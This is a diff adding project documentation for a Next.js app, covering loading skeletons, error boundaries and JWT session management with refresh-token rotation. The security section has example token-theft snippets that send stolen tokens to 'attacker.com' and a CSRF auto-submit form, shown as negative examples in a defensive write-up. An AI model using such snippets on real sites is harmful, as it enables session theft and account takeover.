+                  <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-1/2"></div>
+                </div>
+              </div>
+              
+              {/* Content Skeleton */}
+              <div className="space-y-3">
+                <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-full"></div>
+                <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-5/6"></div>
+                <div className="h-3 bg-gray-200 dark:bg-gray-700 rounded w-4/6"></div>
+              </div>
+              
+              {/* Button Skeleton */}
+              <div className="mt-4 h-10 bg-gray-200 dark:bg-gray-700 rounded"></div>
+            </div>
+          ))}
+        </div>
+      </div>
+    </div>
+  );
+}
+```
+
+**Key Patterns:**
+- **animate-pulse** - Tailwind's built-in pulsing animation
+- **Neutral colors** - gray-200 (light) / gray-700 (dark)
+- **Match structure** - Skeleton mirrors actual content layout
+- **Responsive** - Uses same breakpoints as real content
+- **Accessibility** - Screen readers can skip over loading state
+
+#### Dashboard Loading Skeleton
+
+**File: [app/dashboard/loading.tsx](./ttaurban/app/dashboard/loading.tsx)**
+
+Features:
+- Stats cards skeleton (4 cards in grid)
+- Chart visualization placeholder
+- Table rows skeleton
+- Responsive grid layout
+
+#### Contact Page Loading Skeleton
+
+**File: [app/contact/loading.tsx](./ttaurban/app/contact/loading.tsx)**
+
+Features:
+- Contact info cards skeleton
+- Form fields skeleton
+- Maintains layout structure
+
+### Error Boundaries
+
+#### Users Page Error Boundary
+
+**File: [app/users/error.tsx](./ttaurban/app/users/error.tsx)**
+
+```tsx
+"use client";
+
+export default function Error({
+  error,
+  reset,
+}: {
+  error: Error & { digest?: string };
+  reset: () => void;
+}) {
+  return (
+    <div className="min-h-screen flex items-center justify-center p-6 bg-gray-50 dark:bg-gray-900">
+      <div className="max-w-md w-full bg-white dark:bg-gray-800 rounded-lg shadow-lg p-8 text-center">
+        {/* Error Icon */}
+        <div className="mb-6">
+          <svg className="w-16 h-16 mx-auto text-red-500 dark:text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} 
+              d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          </svg>
+        </div>
+
+        {/* Error Message */}
+        <h2 className="text-2xl font-bold text-gray-900 dark:text-gray-100 mb-2">
+          Oops! Something went wrong
+        </h2>
+        <p className="text-gray-600 dark:text-gray-400 mb-6">
+          {error.message || "We couldn't load the user data. Please try again."}
+        </p>
+
+        {/* Action Buttons */}
+        <div className="flex flex-col sm:flex-row gap-3 justify-center">
+          <button
+            onClick={reset}
+            className="px-6 py-3 bg-indigo-600 dark:bg-indigo-500 text-white rounded-lg 
+                       hover:bg-indigo-700 dark:hover:bg-indigo-600 transition-colors"
+          >
+            Try Again
+          </button>
+          <a href="/" className="px-6 py-3 bg-gray-200 dark:bg-gray-700 text-gray-700 
+                                 dark:text-gray-200 rounded-lg hover:bg-gray-300 dark:hover:bg-gray-600">
+            Go Home
+          </a>
+        </div>
+
+        {/* Help Text */}
+        <p className="mt-6 text-sm text-gray-500 dark:text-gray-400">
+          If this problem persists, please <a href="/contact" className="text-indigo-600 dark:text-indigo-400 hover:underline">contact support</a>.
+        </p>
+      </div>
+    </div>
+  );
+}
+```
+
+**Key Features:**
+- **"use client" directive** - Required for error boundaries
+- **reset() function** - Re-renders the route, allowing retry
+- **error.message** - Shows specific error details
+- **Recovery options** - Try Again + Go Home buttons
+- **Help link** - Directs to contact page
+- **Dark mode support** - Full theme compatibility
+
+#### Dashboard & Contact Error Boundaries
+
+**Files:**
+- [app/dashboard/error.tsx](./ttaurban/app/dashboard/error.tsx)
+- [app/contact/error.tsx](./ttaurban/app/contact/error.tsx)
+
+Each has context-specific:
+- Custom error icons
+- Tailored error messages
+- Alternative contact methods
+
+### Reusable Components
+
+#### Skeleton Components
+
+**File: [components/ui/Skeleton.tsx](./ttaurban/components/ui/Skeleton.tsx)**
+
+```tsx
+// Base Skeleton
+export function Skeleton({ className = "" }: SkeletonProps) {
+  return (
+    <div className={`animate-pulse bg-gray-200 dark:bg-gray-700 rounded ${className}`}></div>
+  );
+}
+
+// Card Skeleton
+export function CardSkeleton() {
+  return (
+    <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md p-6 animate-pulse">
+      <div className="h-5 bg-gray-200 dark:bg-gray-700 rounded w-3/4 mb-4"></div>
+      <div className="space-y-3">
+        <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-full"></div>
+        <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-5/6"></div>
+      </div>
+    </div>
+  );
+}
+
+// Table Row Skeleton
+export function TableRowSkeleton() { /* ... */ }
+
+// Page Skeleton
+export function PageSkeleton() { /* ... */ }
+
+// Spinner
+export function Spinner({ size = "md" }) { /* ... */ }
+```
+
+**Usage Examples:**
+
+```tsx
+// Use base skeleton for custom shapes
+<Skeleton className="h-10 w-48" />
+
+// Use CardSkeleton for card grids
+<div className="grid grid-cols-3 gap-4">
+  {[1,2,3].map(i => <CardSkeleton key={i} />)}
+</div>
+
+// Use Spinner for inline loading
+<button disabled>
+  <Spinner size="sm" /> Loading...
+</button>
+```
+
+#### Error Fallback Component
+
+**File: [components/ui/ErrorFallback.tsx](./ttaurban/components/ui/ErrorFallback.tsx)**
+
+```tsx
+export default function ErrorFallback({
+  error,
+  reset,
+  title = "Something went wrong",
+  description,
+  showDetails = process.env.NODE_ENV === "development",
+  icon,
+}: ErrorFallbackProps) {
+  // Reusable error UI with customization
+}
+```
+
+**Usage:**
+
+```tsx
+// In error.tsx files
+import ErrorFallback from "@/components/ui/ErrorFallback";
+
+export default function Error({ error, reset }) {
+  return (
+    <ErrorFallback
+      error={error}
+      reset={reset}
+      title="Failed to load users"
+      description="We couldn't retrieve the user list."
+    />
+  );
+}
+```
+
+### Testing States
+
+#### 1. Test Loading States
+
+**Simulate Slow Network:**
+
+```tsx
+// In page.tsx
+export default async function UsersPage() {
+  // Add artificial delay
+  await new Promise(resolve => setTimeout(resolve, 3000));
+  
+  const users = await fetchUsers();
+  return <UsersList users={users} />;
+}
+```
+
+**Browser Network Throttling:**
+1. Open DevTools (F12)
+2. Go to Network tab
+3. Select "Slow 3G" or "Fast 3G"
+4. Refresh page to see loading skeleton
+
+#### 2. Test Error States
+
+**Simulate API Error:**
+
+```tsx
+// In page.tsx
+export default async function UsersPage() {
+  const users = await fetchUsers();
+  
+  // Throw error to test error boundary
+  if (!users || users.length === 0) {
+    throw new Error("Failed to load user data");
+  }
+  
+  return <UsersList users={users} />;
+}
+```
+
+**Test Different Error Types:**
+
+```tsx
+// Network error
+throw new Error("Network request failed");
+
+// Authentication error
+throw new Error("Unauthorized: Please log in");
+
+// Not found error
+throw new Error("Resource not found");
+
+// Server error
+throw new Error("Internal server error");
+```
+
+#### 3. Test Recovery Flow
+
+1. Navigate to `/users`
+2. Trigger an error (break API endpoint)
+3. Click "Try Again" button
+4. Verify page re-renders
+5. Fix API endpoint
+6. Click "Try Again" again
+7. Verify successful load
+
+### Files Created
+
+**Loading Files:**
+- [app/users/loading.tsx](./ttaurban/app/users/loading.tsx) - User cards grid skeleton
+- [app/dashboard/loading.tsx](./ttaurban/app/dashboard/loading.tsx) - Stats + chart + table skeleton
+- [app/contact/loading.tsx](./ttaurban/app/contact/loading.tsx) - Contact form skeleton
+
+**Error Files:**
+- [app/users/error.tsx](./ttaurban/app/users/error.tsx) - User data error boundary
+- [app/dashboard/error.tsx](./ttaurban/app/dashboard/error.tsx) - Dashboard error boundary
+- [app/contact/error.tsx](./ttaurban/app/contact/error.tsx) - Contact form error boundary
+
+**Reusable Components:**
+- [components/ui/Skeleton.tsx](./ttaurban/components/ui/Skeleton.tsx) - Skeleton primitives
+- [components/ui/ErrorFallback.tsx](./ttaurban/components/ui/ErrorFallback.tsx) - Reusable error UI
+
+### Key Achievements
+
+1. **✅ Route-Level Loading States** - Each route has custom skeleton matching content
+2. **✅ Error Boundaries Everywhere** - All routes protected from crashes
+3. **✅ Retry Functionality** - Users can recover from errors
+4. **✅ Responsive Skeletons** - Loading states adapt to screen size
+5. **✅ Dark Mode Support** - All states support light/dark themes
+6. **✅ Reusable Components** - Skeleton and ErrorFallback for consistency
+7. **✅ Accessible** - Screen reader friendly, proper ARIA attributes
+8. **✅ Professional UX** - Never show blank screens or crashes
+
+### Design Decisions
+
+**Why Skeletons Over Spinners?**
+- ✅ **Visual Structure:** Users see what's loading
+- ✅ **Perceived Performance:** Feels faster than spinner
+- ✅ **Layout Stability:** No content shift when loaded
+- ✅ **Professional:** Modern apps use skeletons (YouTube, Facebook, LinkedIn)
+- ❌ **More Work:** Must match actual content structure
+
+**Why Route-Level Error Boundaries?**
+- ✅ **Granular Control:** Each route handles errors independently
+- ✅ **Preserved State:** Other routes remain functional
+- ✅ **Custom Messages:** Context-specific error messages
+- ✅ **Better UX:** User doesn't lose entire app
+- ❌ **More Files:** Need error.tsx for each route
+
+**Why Retry Functionality?**
+- ✅ **User Empowerment:** Users can fix transient errors
+- ✅ **Reduced Support:** Less "it's broken" tickets
+- ✅ **Better Conversion:** Users don't abandon app
+- ✅ **Resilience:** Handles network hiccups gracefully
+
+### Best Practices
+
+1. **Match Structure:** Skeleton should mirror actual content layout
+2. **Use Neutral Colors:** gray-200/gray-700 for skeletons
+3. **Add Pulse Animation:** `animate-pulse` for visual feedback
+4. **Provide Context:** Error messages should be specific and helpful
+5. **Offer Recovery:** Always provide "Try Again" button
+6. **Show Alternatives:** "Go Home" or "Contact Support" links
+7. **Test Both States:** Verify loading AND error states work
+8. **Keep It Simple:** Don't overdesign loading states
+9. **Respect Dark Mode:** All states should support themes
+10. **Measure Performance:** Track loading times and error rates
+
+### User Experience Impact
+
+**Loading States:**
+- ⬆️ **Perceived Speed:** Users think app is faster
+- ⬆️ **User Confidence:** Clear feedback builds trust
+- ⬇️ **Bounce Rate:** Users less likely to leave
+- ⬆️ **Engagement:** Professional feel increases engagement
+
+**Error States:**
+- ⬆️ **User Satisfaction:** Graceful failures vs crashes
+- ⬇️ **Support Tickets:** Self-service recovery reduces tickets
+- ⬆️ **Retention:** Users don't abandon app after errors
+- ⬆️ **Trust:** Handling errors well builds user confidence
+
+### Reflection: Why This Matters
+
+In production applications, **asynchronous operations fail**. Networks drop, APIs timeout, servers crash. Users will encounter loading and error states - it's not a question of "if" but "when."
+
+Professional applications handle these states gracefully:
+- **Loading:** Show users progress, not blank screens
+- **Errors:** Offer recovery, not crashes
+- **Empty:** Guide users to action, not confusion
+
+This implementation ensures TTA-Urban maintains user trust even when things go wrong. By providing clear feedback and recovery options, we transform potential frustration into confidence and resilience.
+
+**The difference between amateur and professional apps:**
+- Amateur: Blank screen → Error → Confusion → User leaves
+- Professional: Skeleton → Error with retry → Recovery → User stays
+
+---
+
+## 🔐 Secure JWT & Session Management
+
+A comprehensive implementation of secure token-based authentication using **JWT (JSON Web Tokens)** with **access and refresh token rotation** to protect against common security threats like XSS and CSRF.
+
+### Overview
+
+This implementation provides:
+- **Dual Token System:** Short-lived access tokens (15 min) + Long-lived refresh tokens (7 days)
+- **HTTP-Only Cookies:** Refresh tokens stored securely, inaccessible to JavaScript
+- **Token Rotation:** Automatic refresh token rotation on each refresh for enhanced security
+- **XSS Protection:** Tokens isolated from JavaScript access
+- **CSRF Protection:** SameSite cookies + Origin header validation
+- **Automatic Refresh:** Client-side auto-retry on 401 errors
+
+### JWT Structure
+
+A JSON Web Token consists of three parts separated by dots:
+
+```
+header.payload.signature
+```
+
+**Decoded Structure:**
+
+```json
+{
+  "header": {
+    "alg": "HS256",
+    "typ": "JWT"
+  },
+  "payload": {
+    "id": 12345,
+    "email": "user@example.com",
+    "name": "John Doe",
+    "role": "CITIZEN",
+    "exp": 1715120000,
+    "iss": "ttaurban-api",
+    "aud": "ttaurban-client"
+  },
+  "signature": "hashed-verification-string"
+}
+```
+
+**Components:**
+- **Header:** Algorithm (HS256) and token type (JWT)
+- **Payload:** User claims (id, email, role, expiry, issuer, audience)
+- **Signature:** HMAC hash ensuring token integrity and authenticity
+
+⚠️ **Security Note:** JWTs are **encoded**, not **encrypted**. Never store sensitive data (passwords, SSNs, etc.) in the payload.
+
+### Access vs Refresh Tokens
+
+| Feature | Access Token | Refresh Token |
+|---------|-------------|---------------|
+| **Purpose** | API authentication | Obtain new access tokens |
+| **Lifespan** | 15 minutes | 7 days |
+| **Storage** | Memory (client state) | HTTP-only cookie |
+| **Data** | Full user info (id, email, name, role) | Minimal info (id, email) |
+| **Rotation** | No (short-lived) | Yes (on every refresh) |
+| **Exposure** | Sent with every API request | Sent only to refresh endpoint |
+
+**Why Two Tokens?**
+
+- **Short Access Token Lifespan:** Limits damage from token theft (15-min window)
+- **Long Refresh Token Lifespan:** User doesn't need to login every 15 minutes
+- **Secure Storage:** Refresh token in HTTP-only cookie prevents XSS attacks
+- **Token Rotation:** New refresh token issued on each refresh prevents replay attacks
+
+### Storage Location & Security
+
+#### Access Token
+**Storage:** In-memory (React state via `AuthContext`)
+
+```tsx
+const [accessToken, setAccessToken] = useState<string | null>(null);
+```
+
+**Pros:**
+- ✅ Not vulnerable to XSS (cleared on page reload)
+- ✅ Fast access for API requests
+
+**Cons:**
+- ❌ Lost on page refresh (requires refresh token to restore)
+
+#### Refresh Token
+**Storage:** HTTP-only, SameSite Strict Cookie
+
+```typescript
+response.cookies.set("refreshToken", refreshToken, {
+  httpOnly: true,        // ✅ Not accessible to JavaScript (XSS protection)
+  secure: true,          // ✅ HTTPS only in production
+  sameSite: "strict",    // ✅ CSRF protection
+  maxAge: 7 * 24 * 60 * 60, // 7 days
+  path: "/",
+});
+```
+
+**Security Benefits:**
+- ✅ **XSS Protection:** JavaScript can't read `httpOnly` cookies
+- ✅ **CSRF Protection:** `sameSite: strict` prevents cross-site requests
+- ✅ **Secure Transmission:** `secure: true` enforces HTTPS
+- ✅ **Automatic Inclusion:** Browser sends cookie automatically
+
+**Why Not localStorage?**
+
+```typescript
+// ❌ NEVER DO THIS - Vulnerable to XSS
+localStorage.setItem("refreshToken", token);
+
+// Malicious script can steal token:
+const stolenToken = localStorage.getItem("refreshToken");
+fetch("https://attacker.com/steal", { body: stolenToken });
+```
+
+localStorage is accessible to **any JavaScript** on the page, including:
+- Third-party scripts
+- Browser extensions
+- XSS attacks (injected scripts)
+
+### Authentication Flow
+
+#### 1. Login/Signup Flow
+
+```
+┌─────────┐                  ┌─────────┐
+│  Client │                  │  Server │
+└────┬────┘                  └────┬────┘
+     │                            │
+     │ POST /api/auth/login       │
+     │ { email, password }        │
+     ├───────────────────────────>│
+     │                            │
+     │        ┌──────────────────┐│
+     │        │ Validate password││
+     │        │ Generate tokens  ││
+     │        └──────────────────┘│
+     │                            │
+     │  { accessToken, user }     │
+     │  Set-Cookie: refreshToken  │
+     │<───────────────────────────┤
+     │                            │
+     │  ┌────────────────────┐    │
+     │  │ Store accessToken  │    │
+     │  │ in memory (state)  │    │
+     │  └────────────────────┘    │
+     │                            │
+```
+
+**Login Implementation:**
+
+```typescript
+// Server: app/api/auth/login/route.ts
+const { accessToken, refreshToken } = generateTokenPair({
+  id: user.id,
+  email: user.email,
+  role: user.role,
+  name: user.name,
+});
+
+const response = NextResponse.json({ success: true, accessToken, user });
+
+response.cookies.set("refreshToken", refreshToken, {
+  httpOnly: true,
+  secure: process.env.NODE_ENV === "production",
+  sameSite: "strict",
+  maxAge: 7 * 24 * 60 * 60,
+});
+
+return response;
+```
+
+```tsx
+// Client: context/AuthContext.tsx
+const login = async (email: string, password: string) => {
+  const response = await fetch("/api/auth/login", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    credentials: "include", // ✅ Include cookies
+    body: JSON.stringify({ email, password }),
+  });
+
+  const data = await response.json();
+  
+  if (data.success) {
+    setAccessToken(data.accessToken); // Store in memory
+    setUser(data.user);
+  }
+};
+```
+
+#### 2. Protected API Request Flow
+
+```
+┌─────────┐                  ┌─────────┐
+│  Client │                  │  Server │
+└────┬────┘                  └────┬────┘
+     │                            │
+     │ GET /api/users             │
+     │ Authorization: Bearer {AT} │
+     ├───────────────────────────>│
+     │                            │
+     │        ┌──────────────────┐│
+     │        │ Verify access    ││
+     │        │ token (valid)    ││
+     │        └──────────────────┘│
+     │                            │
+     │  { success: true, data }   │
+     │<───────────────────────────┤
+     │                            │
+```
+
+**Middleware Protection:**
+
+```typescript
+// app/lib/authMiddleware.ts
+export function withAuth(handler: AuthenticatedHandler) {
+  return async (req: NextRequest) => {
+    const token = req.headers.get("authorization")?.split(" ")[1];
+    
+    if (!token) {
+      return NextResponse.json({ error: "MISSING_TOKEN" }, { status: 401 });
+    }
+    
+    const user = verifyAccessToken(token);
+    
+    if (!user) {
+      return NextResponse.json({ error: "INVALID_TOKEN" }, { status: 401 });
+    }
+    
+    return await handler(req, user); // Inject user into handler
+  };
+}
+```
+
+**Protected Route:**
+
+```typescript
+// app/api/users/route.ts
+import { withAuth } from "@/app/lib/authMiddleware";
+
+export const GET = withAuth(async (req, user) => {
+  // user is automatically available and verified
+  const users = await prisma.user.findMany();
+  return NextResponse.json({ success: true, users });
+});
+```
+
+#### 3. Token Refresh Flow
+
+```
+┌─────────┐                  ┌─────────┐
+│  Client │                  │  Server │
+└────┬────┘                  └────┬────┘
+     │                            │
+     │ GET /api/users             │
+     │ Authorization: Bearer {AT} │
+     ├───────────────────────────>│
+     │                            │
+     │        ┌──────────────────┐│
+     │        │ Access token     ││
+     │        │ EXPIRED!         ││
+     │        └──────────────────┘│
+     │                            │
+     │  { error: "INVALID_TOKEN" }│
+     │  401 Unauthorized          │
+     │<───────────────────────────┤
+     │                            │
+     │  ┌────────────────────┐    │
+     │  │ Detect 401 error   │    │
+     │  │ Try refresh        │    │
+     │  └────────────────────┘    │
+     │                            │
+     │ POST /api/auth/refresh     │
+     │ Cookie: refreshToken={RT}  │
+     ├───────────────────────────>│
+     │                            │
+     │        ┌──────────────────┐│
+     │        │ Verify refresh   ││
+     │        │ token (valid)    ││
+     │        │ Generate new pair││
+     │        └──────────────────┘│
+     │                            │
+     │  { accessToken, user }     │
+     │  Set-Cookie: refreshToken  │
+     │  (NEW rotated token)       │
+     │<───────────────────────────┤
+     │                            │
+     │  ┌────────────────────┐    │
+     │  │ Store new AT       │    │
+     │  │ Retry original req │    │
+     │  └────────────────────┘    │
+     │                            │
+     │ GET /api/users             │
+     │ Authorization: Bearer {NEW}│
+     ├───────────────────────────>│
+     │                            │
+     │  { success: true, data }   │
+     │<───────────────────────────┤
+     │                            │
+```
+
+**Refresh Endpoint:**
+
+```typescript
+// app/api/auth/refresh/route.ts
+export async function POST(req: NextRequest) {
+  const refreshToken = req.cookies.get("refreshToken")?.value;
+  
+  if (!refreshToken) {
+    return NextResponse.json({ error: "MISSING_REFRESH_TOKEN" }, { status: 401 });
+  }
+  
+  const decoded = verifyRefreshToken(refreshToken);
+  
+  if (!decoded) {
+    const response = NextResponse.json({ error: "INVALID_REFRESH_TOKEN" }, { status: 401 });
+    response.cookies.delete("refreshToken"); // Clear invalid token
+    return response;
+  }
+  
+  // Fetch fresh user data
+  const user = await prisma.user.findUnique({ where: { id: decoded.id } });
+  
+  if (!user) {
+    return NextResponse.json({ error: "USER_NOT_FOUND" }, { status: 404 });
+  }
+  
+  // Generate new token pair (token rotation)
+  const { accessToken, refreshToken: newRefreshToken } = generateTokenPair(user);
+  
+  const response = NextResponse.json({ success: true, accessToken, user });
+  
+  // Rotate refresh token
+  response.cookies.set("refreshToken", newRefreshToken, {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "strict",
+    maxAge: 7 * 24 * 60 * 60,
+  });
+  
+  return response;
+}
+```
+
+**Client-Side Auto Refresh:**
+
+```tsx
+// context/AuthContext.tsx
+const refreshToken = async (): Promise<boolean> => {
+  try {
+    const response = await fetch("/api/auth/refresh", {
+      method: "POST",
+      credentials: "include", // Include refresh token cookie
+    });
+
+    if (!response.ok) return false;
+
+    const data = await response.json();
+
+    if (data.success) {
+      setAccessToken(data.accessToken);
+      setUser(data.user);
+      return true;
+    }
+
+    return false;
+  } catch (error) {
+    console.error("Token refresh error:", error);
+    setAccessToken(null);
+    setUser(null);
+    return false;
+  }
+};
+
+// Auto-refresh on mount (restore session)
+useEffect(() => {
+  const initAuth = async () => {
+    setIsLoading(true);
+    await refreshToken(); // Try to restore session
+    setIsLoading(false);
+  };
+
+  initAuth();
+}, []);
+```
+
+**Fetch with Auto-Retry:**
+
+```typescript
+// lib/fetchWithAuth.ts
+export async function fetchWithAuth(url: string, options: RequestInit = {}): Promise<Response> {
+  const headers = new Headers(options.headers);
+  
+  if (currentAccessToken) {
+    headers.set("Authorization", `Bearer ${currentAccessToken}`);
+  }
+
+  let response = await fetch(url, { ...options, headers, credentials: "include" });
+
+  // If 401 Unauthorized, try to refresh token and retry
+  if (response.status === 401) {
+    console.log("Access token expired, attempting refresh...");
+    
+    const newToken = await refreshAccessToken();
+    
+    if (newToken) {
+      currentAccessToken = newToken;
+      console.log("Token refreshed successfully, retrying request...");
+      
+      // Retry with new token
+      headers.set("Authorization", `Bearer ${newToken}`);
+      response = await fetch(url, { ...options, headers, credentials: "include" });
+    } else {
+      console.error("Token refresh failed, redirecting to login...");
+      window.location.href = "/login";
+    }
+  }
+
+  return response;
+}
+```
+
+#### 4. Logout Flow
+
+```
+┌─────────┐                  ┌─────────┐
+│  Client │                  │  Server │
+└────┬────┘                  └────┬────┘
+     │                            │
+     │ POST /api/auth/logout      │
+     │ Cookie: refreshToken={RT}  │
+     ├───────────────────────────>│
+     │                            │
+     │        ┌──────────────────┐│
+     │        │ Clear refresh    ││
+     │        │ token cookie     ││
+     │        └──────────────────┘│
+     │                            │
+     │  { success: true }         │
+     │  Set-Cookie: refreshToken= │
+     │  (cleared)                 │
+     │<───────────────────────────┤
+     │                            │
+     │  ┌────────────────────┐    │
+     │  │ Clear accessToken  │    │
+     │  │ from memory        │    │
+     │  │ Clear user state   │    │
+     │  └────────────────────┘    │
+     │                            │
+```
+
+**Logout Implementation:**
+
+```typescript
+// app/api/auth/logout/route.ts
+export async function POST(req: NextRequest) {
+  const response = NextResponse.json({
+    success: true,
+    message: "Logout successful",
+  });
+
+  // Clear refresh token cookie
+  response.cookies.delete("refreshToken");
+
+  return response;
+}
+```
+
+```tsx
+// context/AuthContext.tsx
+const logout = async () => {
+  try {
+    await fetch("/api/auth/logout", {
+      method: "POST",
+      credentials: "include",
+    });
+
+    setAccessToken(null);
+    setUser(null);
+    toast.success("Logged out successfully");
+  } catch (error) {
+    // Still clear local state even if server request fails
+    setAccessToken(null);
+    setUser(null);
+  }
+};
+```
+
+### Security Threat Mitigation
+
+| Threat | Description | Mitigation Strategy |
+|--------|-------------|---------------------|
+| **XSS (Cross-Site Scripting)** | Malicious scripts steal tokens from localStorage/cookies | ✅ Refresh token in `httpOnly` cookie<br>✅ Access token in memory (lost on XSS)<br>✅ Content Security Policy headers<br>✅ Input sanitization |
+| **CSRF (Cross-Site Request Forgery)** | Attacker tricks user into making authenticated requests | ✅ `sameSite: strict` cookies<br>✅ Origin header validation<br>✅ CSRF tokens (future)<br>✅ Custom headers (Authorization) |
+| **Token Replay Attack** | Stolen token reused by attacker | ✅ Short access token lifespan (15 min)<br>✅ Refresh token rotation<br>✅ HTTPS only (production)<br>✅ Token binding (future) |
+| **Man-in-the-Middle (MITM)** | Attacker intercepts network traffic | ✅ HTTPS enforced (production)<br>✅ HSTS headers<br>✅ Certificate pinning (mobile apps) |
+| **Token Theft from Cookies** | Attacker steals cookies via XSS | ✅ `httpOnly` flag prevents JS access<br>✅ `secure` flag (HTTPS only)<br>✅ `sameSite` flag prevents CSRF |
+
+#### XSS Protection
+
+**Without httpOnly Cookie:**
+
+```javascript
+// ❌ Vulnerable code
+document.cookie = "refreshToken=" + token; // Readable by JavaScript!
+
+// Attacker injects script:
+<script>
+  const stolenToken = document.cookie.match(/refreshToken=([^;]+)/)[1];
+  fetch("https://attacker.com/steal", { body: stolenToken });
+</script>
+```
+
+**With httpOnly Cookie:**
+
+```typescript
+// ✅ Secure implementation
+response.cookies.set("refreshToken", token, {
+  httpOnly: true, // JavaScript CANNOT access this cookie
+  secure: true,
+  sameSite: "strict",
+});
+
+// Attacker's script fails:
+console.log(document.cookie); // Output: "" (empty, httpOnly cookies not visible)
+```
+
+#### CSRF Protection
+
+**Without SameSite Protection:**
+
+```html
+<!-- Attacker's malicious site -->
+<form action="https://ttaurban.com/api/auth/logout" method="POST">
+  <input type="hidden" name="action" value="logout">
+</form>
+<script>
+  // Auto-submit form when user visits page
+  document.forms[0].submit();
+  // User's cookies sent automatically - CSRF attack succeeds!
+</script>
+```
+
+**With SameSite Protection:**
+
+```typescript
+// ✅ Secure cookie configuration
+response.cookies.set("refreshToken", token, {
+  sameSite: "strict", // Cookie only sent on same-site requests
+});
+
+// Attacker's cross-site request FAILS:
+// Browser blocks cookie from being sent to cross-origin request
+```
+
+**Additional CSRF Protection in Middleware:**
+
+```typescript
+// middleware.ts
+if (["POST", "PUT", "DELETE", "PATCH"].includes(req.method)) {
+  const origin = req.headers.get("origin");
+  const host = req.headers.get("host");
+
+  // Allow same-origin requests only
+  if (origin && host && !origin.includes(host)) {
+    console.warn(`CSRF blocked: Origin ${origin} != Host ${host}`);
+    return NextResponse.json({ error: "CSRF_PROTECTION" }, { status: 403 });
+  }
+}
+```
+
+#### Token Replay Attack Prevention
+
+**Problem:** Attacker steals token and reuses it
+
+**Solutions:**
+
+1. **Short Access Token Lifespan** (15 minutes)
+   ```typescript
+   // Token expires quickly, limiting damage window
+   expiresIn: "15m"
+   ```
+
+2. **Refresh Token Rotation**
+   ```typescript
+   // Every refresh generates NEW refresh token, invalidating old one
+   const { refreshToken: newRefreshToken } = generateTokenPair(user);
+   response.cookies.set("refreshToken", newRefreshToken, { ... });
+   ```
+
+3. **Token Binding** (Future Enhancement)
+   ```typescript
+   // Bind token to device/IP/fingerprint
+   const deviceId = getDeviceFingerprint(req);
+   const token = jwt.sign({ ...user, deviceId }, secret);
+   
+   // Verify device on each request
+   if (decoded.deviceId !== currentDeviceId) {
+     throw new Error("Token used from different device!");
+   }
+   ```
+
+### Security Headers
+
+Implemented in [middleware.ts](./ttaurban/middleware.ts):
+
+```typescript
+// Prevent XSS attacks
+response.headers.set("X-XSS-Protection", "1; mode=block");
+
+// Prevent clickjacking
+response.headers.set("X-Frame-Options", "DENY");
+
+// Prevent MIME type sniffing
+response.headers.set("X-Content-Type-Options", "nosniff");
+
+// Referrer policy
+response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
+
+// Content Security Policy
+const cspHeader = `
+  default-src 'self';
+  script-src 'self' 'unsafe-inline' 'unsafe-eval';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data: https:;
+  font-src 'self' data:;
+  connect-src 'self';
+  frame-ancestors 'none';
+`;
+response.headers.set("Content-Security-Policy", cspHeader);
+
+// HTTPS enforcement (production only)
+if (process.env.NODE_ENV === "production") {
+  response.headers.set(
+    "Strict-Transport-Security",
+    "max-age=31536000; includeSubDomains; preload"
+  );
+}
+```
+
+### Implementation Files
+
+**Server-Side:**
+- [app/lib/jwt.ts](./ttaurban/app/lib/jwt.ts) - JWT generation, verification, token utilities
+- [app/lib/authMiddleware.ts](./ttaurban/app/lib/authMiddleware.ts) - Route protection middleware (`withAuth`, `withRole`)
+- [app/api/auth/login/route.ts](./ttaurban/app/api/auth/login/route.ts) - Login endpoint with token generation
+- [app/api/auth/signup/route.ts](./ttaurban/app/api/auth/signup/route.ts) - Signup endpoint with auto-login
+- [app/api/auth/refresh/route.ts](./ttaurban/app/api/auth/refresh/route.ts) - Token refresh with rotation
+- [app/api/auth/logout/route.ts](./ttaurban/app/api/auth/logout/route.ts) - Logout endpoint (clears cookies)
+- [app/api/auth/me/route.ts](./ttaurban/app/api/auth/me/route.ts) - Protected route example
+- [middleware.ts](./ttaurban/middleware.ts) - Security headers, CSRF protection, auth checks
+
+**Client-Side:**
+- [context/AuthContext.tsx](./ttaurban/context/AuthContext.tsx) - Auth state management, login/logout/refresh logic
+- [lib/fetchWithAuth.ts](./ttaurban/lib/fetchWithAuth.ts) - Fetch wrapper with automatic token refresh
+
+**Testing:**
+- [test-auth-flow.js](./ttaurban/test-auth-flow.js) - Automated test script for authentication flow
+
+### Testing Evidence
+
+#### Test Script Output
+
+Run the test script to verify complete authentication flow:
+
+```bash
+node test-auth-flow.js
+```
+
+**Expected Output:**
+
+```
+══════════════════════════════════════════════════
+🔐 JWT AUTHENTICATION FLOW TEST
+══════════════════════════════════════════════════
+
+🧪 Test 1: User Signup
+──────────────────────────────────────────────────
+✅ Signup successful
+   User: Test User (test@example.com)
+   Access Token: eyJhbGciOiJIUzI1NiIs...
+   Refresh Token: Set in cookie ✓
+
+🧪 Test 2: User Login
+──────────────────────────────────────────────────
+✅ Login successful
+   User: Test User
+   Role: CITIZEN
+   Access Token: eyJhbGciOiJIUzI1NiIs...
+   Refresh Token: Set in cookie ✓
+
+🧪 Test 3: Access Protected Route
+──────────────────────────────────────────────────
+✅ Protected route access successful
+   User Data: { id: 1, name: 'Test User', email: 'test@example.com', role: 'CITIZEN' }
+
+🧪 Test 4: Token Refresh
+──────────────────────────────────────────────────
+✅ Token refresh successful
+   Old Token: eyJhbGciOiJIUzI1NiIs...
+   New Token: eyJhbGciOiJIUzI1NiIa...
+   Tokens Different: Yes ✓
+   New Refresh Token: Rotated ✓
+
+🧪 Test 5: Access with Refreshed Token
+──────────────────────────────────────────────────
+✅ Access with refreshed token successful
+   User: Test User
+
+🧪 Test 6: Logout
